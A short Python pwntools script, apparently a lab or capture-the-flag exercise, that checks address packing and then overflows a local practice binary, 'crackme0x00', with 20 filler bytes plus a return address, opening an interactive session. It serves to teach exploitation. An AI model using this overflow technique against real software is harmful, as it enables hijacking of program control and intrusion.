#!/usr/bin/env python2

import os
import sys

from pwn import *

if __name__ == '__main__':

    assert p32(0x0804871b) == b'\x1b\x87\x04\x08'                 # Q1
    assert p64(0x0804871b) == b'\x1b\x87\x04\x08\x00\x00\x00\x00'                 # Q2

    payload = b"AAAABBBBCCCCDDDDEEEE"+p32(0x0804871b)
    
    p = process(["./crackme0x00"])
    p.send(payload + b"\n")
    p.interactive()
